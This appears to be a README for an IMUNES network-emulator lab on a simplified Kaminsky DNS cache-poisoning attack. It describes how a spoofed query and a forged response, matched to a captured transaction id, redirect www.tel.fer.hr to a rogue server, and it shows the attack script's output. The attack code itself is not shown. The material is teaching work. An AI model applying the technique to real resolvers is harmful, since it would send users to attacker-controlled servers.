# DNS spoofing attack

This example covers the DNS spoofing attack, a simplified version of the
Kaminsky DNS attack. The IMUNES topology looks like this:

![DNS spoofing topology](http://imunes.tel.fer.hr/images/topologies/kaminsky.png)

## Starting the DNS server hierarchy
Start the experiment specified in `dnsspoof.imn` and issue the
[prepare.sh](prepare.sh) command to start all the DNS and HTTP servers.
```console
# ./prepare.sh
```
This script will also send one packet to the dnsZpm server so that it
communicates with the rest of the hierarchy and caches the authoritative server
for the tel.fer.hr domain.

## Executing the attack
The attack is executed by running the [dnsspoof.sh](dnsspoof.sh) script. This
script first creates a fake DNS query for the FQDN www.tel.fer.hr on the
attacker. The fake query has a spoofed source IP of the victim pc node
(30.0.0.3).

The attacker has taken control of the R9 node and captures the outgoing DNS id
that it needs to craft a malicious response with the address of the RogueServer
instead of the www.tel.fer.hr server.

The dnsTel node is under a DDoS attack that is simulated by delaying traffic
to that node by 2 seconds.

Script output is shown below:
```console

# ./dnsspoof.sh 
Try 1 / 5...
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes

...

Sent 1 packets.
1 packet captured
3 packets received by filter
0 packets dropped by kernel

...

Did it work?

www.tel.fer.hr has address 10.0.11.10
PING www.tel.fer.hr (10.0.11.10): 56 data bytes
64 bytes from 10.0.11.10: icmp_seq=0 ttl=62 time=0.085 ms
64 bytes from 10.0.11.10: icmp_seq=1 ttl=62 time=0.063 ms
64 bytes from 10.0.11.10: icmp_seq=2 ttl=62 time=0.063 ms
--- www.tel.fer.hr ping statistics ---
3 packets transmitted, 3 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.063/0.070/0.085/0.010 ms

Success!
```
